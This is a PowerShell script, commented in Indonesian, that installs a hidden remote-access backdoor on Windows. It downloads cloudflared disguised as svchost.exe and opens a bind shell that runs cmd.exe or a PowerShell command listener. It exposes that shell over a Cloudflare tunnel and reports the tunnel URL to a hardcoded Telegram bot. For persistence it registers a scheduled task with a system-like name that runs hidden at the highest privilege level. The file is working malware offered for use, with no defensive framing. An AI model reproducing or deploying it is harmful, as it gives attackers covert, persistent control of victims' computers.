# Cloudflare Tunnel Reverse Shell untuk Windows (Hidden)
# Jalankan: powershell -NoProfile -ExecutionPolicy Bypass -File script.ps1
# Uninstall: $env:CF_UNINSTALL = "<token>"; .\script.ps1

$ErrorActionPreference = "Stop"

# ========== KONFIGURASI ==========
$HOME = $env:USERPROFILE
$CONFIG_DIR = "$HOME\.config\dbus"
$TMPDIR = "$env:TEMP\.cf-$([System.Environment]::UserName)"
$BIN_HIDDEN_NAME = "svchost.exe"   # Nama proses palsu (seperti sistem)
$PORT = Get-Random -Minimum 10000 -Maximum 50000

# Telegram
$TELEGRAM_BOT_TOKEN = "8703082173:AAHQceSe7KIgRm973z8aG-WLP7us0tqHLV8"
$TELEGRAM_CHAT_ID = "6223261018"

# URL unduhan cloudflared (sesuai arsitektur Windows)
$ARCH = if ([System.Environment]::Is64BitOperatingSystem) { "windows-amd64" } else { "windows-386" }
$URL_CLOUDFLARED = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-$ARCH.exe"

# ========== FUNGSI ==========
function Send-Telegram {
    param($Message)
    if ($TELEGRAM_BOT_TOKEN -and $TELEGRAM_BOT_TOKEN -ne "1234567890:ABCdefGHIjklMNOpqrsTUVwxyz") {
        $body = @{ chat_id = $TELEGRAM_CHAT_ID; text = $Message; parse_mode = "HTML" }
        Invoke-RestMethod -Uri "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage" -Method Post -Body $body -ErrorAction SilentlyContinue
    }
}

function Start-HiddenProcess {
    param($Command, $Arguments)
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = $Command
    $psi.Arguments = $Arguments
    $psi.UseShellExecute = $false
    $psi.CreateNoWindow = $true
    $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
    $psi.RedirectStandardOutput = $true
    $psi.RedirectStandardError = $true
    $p = [System.Diagnostics.Process]::Start($psi)
    $p.Id
}

# ========== UNINSTALL ==========
if ($env:CF_UNINSTALL) {
    $tokenFile = "$CONFIG_DIR\.uninstall_token"
    if (Test-Path $tokenFile) {
        $storedToken = Get-Content $tokenFile -Raw
        if ($env:CF_UNINSTALL -eq $storedToken) {
            Write-Host "Removing installed files..."
            # Hentikan task dan proses
            schtasks /End /TN "Microsoft\Windows\Winlogon\Shell" 2>$null
            schtasks /Delete /TN "Microsoft\Windows\Winlogon\Shell" /F 2>$null
            Get-Process -Name "svchost" -ErrorAction SilentlyContinue | Where-Object { $_.StartInfo.FileName -like "*cloudflared*" } | Stop-Process -Force
            Remove-Item -Recurse -Force $CONFIG_DIR -ErrorAction SilentlyContinue
            Remove-Item -Recurse -Force $TMPDIR -ErrorAction SilentlyContinue
            Write-Host "Uninstall complete."
            exit 0
        } else {
            Write-Host "Invalid token."
            exit 1
        }
    } else {
        Write-Host "No installation found."
        exit 1
    }
}

# Cek instalasi yang sudah ada
if (Test-Path "$CONFIG_DIR\.uninstall_token") {
    Write-Host "Installation already detected. Uninstall first with token."
    exit 1
}

# Buat direktori
New-Item -ItemType Directory -Force -Path $TMPDIR | Out-Null
New-Item -ItemType Directory -Force -Path $CONFIG_DIR | Out-Null

# ========== DOWNLOAD CLOUDFLARED ==========
Write-Host "Downloading cloudflared..."
$cfPath = "$CONFIG_DIR\$BIN_HIDDEN_NAME"
Invoke-WebRequest -Uri $URL_CLOUDFLARED -OutFile $cfPath -ErrorAction Stop

# ========== START BINDSHELL (local) ==========
Write-Host "Starting bindshell on port $PORT ..."
# Gunakan netcat jika ada, atau PowerShell TCP listener
if (Get-Command nc -ErrorAction SilentlyContinue) {
    $bindCmd = "nc -l -p $PORT -s 127.0.0.1 -e cmd.exe"
} else {
    # PowerShell listener (simple)
    $bindCmd = "powershell -NoProfile -Command `"`$listener = [System.Net.Sockets.TcpListener]::new('127.0.0.1', $PORT); `$listener.Start(); while(`$true) { `$client = `$listener.AcceptTcpClient(); `$stream = `$client.GetStream(); `$writer = New-Object System.IO.StreamWriter `$stream; `$reader = New-Object System.IO.StreamReader `$stream; `$writer.AutoFlush = `$true; `$writer.WriteLine('> '); while(`$client.Connected) { if (`$stream.DataAvailable) { `$cmd = `$reader.ReadLine(); if (`$cmd -eq 'exit') { break }; `$output = & `$cmd 2>&1 | Out-String; `$writer.WriteLine(`$output); `$writer.Write('> ') } } `$client.Close() }`""
}
$bindPid = Start-HiddenProcess "cmd.exe" "/c $bindCmd"

# ========== START TUNNEL ==========
Write-Host "Starting Cloudflare tunnel..."
$tunnelLog = "$TMPDIR\cloudflared.log"
$tunnelArgs = "tunnel --url tcp://127.0.0.1:$PORT"
$tunnelProc = Start-Process -FilePath $cfPath -ArgumentList $tunnelArgs -WindowStyle Hidden -PassThru -RedirectStandardOutput $tunnelLog -RedirectStandardError $tunnelLog
$tunnelPid = $tunnelProc.Id

# ========== SIMPAN PID DAN TOKEN ==========
$token = ([System.BitConverter]::ToString((New-Guid).ToByteArray()) -replace '-', '').Substring(0,16)
$token | Out-File -FilePath "$CONFIG_DIR\.uninstall_token"
@"
BIND_PID=$bindPid
TUNNEL_PID=$tunnelPid
PORT=$PORT
"@ | Out-File -FilePath "$CONFIG_DIR\tunnel.conf"

# ========== TUNGGU URL DAN KIRIM TELEGRAM ==========
Write-Host "Waiting for tunnel URL..."
Start-Sleep -Seconds 5
$url = Select-String -Path $tunnelLog -Pattern "https://([a-z0-9-]+)\.trycloudflare\.com" | Select-Object -First 1 | ForEach-Object { $_.Matches[0].Value }
if ($url) {
    Write-Host "Tunnel URL: $url"
    Send-Telegram "✅ Initial Tunnel URL: $url"
} else {
    Write-Host "No URL found yet, check log: $tunnelLog"
}

# ========== PERSISTENCE ==========
Write-Host "Installing persistence..."
$taskName = "Microsoft\Windows\Winlogon\Shell"  # Nama task mirip sistem
$persistScript = "$CONFIG_DIR\cf_tunnel.ps1"
@"
# Persistence script
`$cfPath = "$cfPath"
`$PORT = $PORT
`$log = "$TMPDIR\cloudflared.log"
`$procName = "$BIN_HIDDEN_NAME"
while (`$true) {
    `$p = Start-Process -FilePath `$cfPath -ArgumentList "tunnel --url tcp://127.0.0.1:`$PORT" -WindowStyle Hidden -PassThru -RedirectStandardOutput `$log -RedirectStandardError `$log
    `$p.WaitForExit()
    Start-Sleep -Seconds 10
}
"@ | Out-File -FilePath $persistScript -Encoding UTF8

# Buat Scheduled Task dengan trigger at logon, run hidden, dan dengan privilege tinggi
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$persistScript`""
$trigger = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
$principal = New-ScheduledTaskPrincipal -UserID $env:USERNAME -LogonType Interactive -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden
Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force | Out-Null

Write-Host "--> Persistence installed (Scheduled Task: $taskName)"
Write-Host "--> To uninstall: `$env:CF_UNINSTALL = '$token'; .\script.ps1"
Write-Host "--> Join us on Telegram - https://t.me/thcorg"
